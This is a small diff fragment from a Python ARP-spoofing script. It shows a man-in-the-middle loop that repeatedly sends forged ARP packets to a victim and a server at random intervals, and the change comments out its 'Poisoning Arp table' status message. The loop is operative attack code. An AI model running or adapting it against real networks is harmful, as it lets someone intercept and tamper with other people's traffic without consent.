@@ -34,7 +34,7 @@ def MIMspoofARP(ipVictim, ipServer):
 
     try:
         while(True):
-            print("Poisoning Arp table")
+#             print("Poisoning Arp table")
             sendp(arpTo, iface=interface, verbose=False)
             sendp(arpFrom, iface=interface, verbose=False)
             time.sleep(rd.randrange(5,20))
